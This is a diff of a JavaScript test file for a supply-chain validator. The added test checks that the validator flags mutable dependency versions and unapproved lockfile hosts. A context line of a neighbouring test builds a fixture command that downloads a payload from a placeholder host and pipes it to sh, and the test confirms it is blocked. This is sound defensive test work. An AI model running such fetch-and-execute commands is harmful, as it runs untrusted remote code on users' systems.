@@ -699,6 +699,30 @@ test("segunda camada bloqueia dependência, embed e busca Git externos", () => {
   );
 });
 
+test("segunda camada protege manifesto e lockfile contra resolução mutável", () => {
+  assert.equal(
+    validateGenericAddedText('"outside": "^1.2.3",', "package.json", 8)
+      .some((finding) => finding.code === "EXTERNAL_DELTA_MUTABLE_DEPENDENCY_VERSION"),
+    true,
+  );
+  assert.equal(
+    validateGenericAddedText(
+      '"resolved": "https://example.invalid/outside-1.0.0.tgz"',
+      "package-lock.json",
+      12,
+    ).some((finding) => finding.code === "EXTERNAL_DELTA_UNAPPROVED_LOCK_HOST"),
+    true,
+  );
+  assert.deepEqual(
+    validateGenericAddedText(
+      '"resolved": "https://registry.npmjs.org/safe/-/safe-1.0.0.tgz"',
+      "package-lock.json",
+      12,
+    ),
+    [],
+  );
+});
+
 test("segunda camada mede o delta Git e não reabre dívida histórica", () => {
   const remoteShell = ["wg", "et https://example.invalid/x -O payload | sh"].join("");
   const blocked = deltaFixture("docs/novo.txt", null, `${remoteShell}\n`);
